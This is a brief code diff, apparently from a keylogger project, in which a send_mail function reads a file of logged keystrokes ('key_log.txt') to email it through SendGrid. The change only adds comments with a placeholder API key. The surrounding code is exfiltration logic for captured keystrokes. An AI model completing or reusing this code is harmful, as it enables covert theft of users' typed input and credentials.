@@ -16,6 +16,8 @@ def send_mail():
     to_mail = ['']
     SENDGRID_API_KEY=os.getenv('SEND_GRID')
     #Add your own sendgrid API key
+    #For ex. SENDGRID_API_KEY='Sg.jdij382u392ndjkkds!'
+    #The key is invalid so cannot be replaced
     pdf = open('key_log.txt', "r").read()
     with open('key_log.txt','r') as f:
         for x in f:
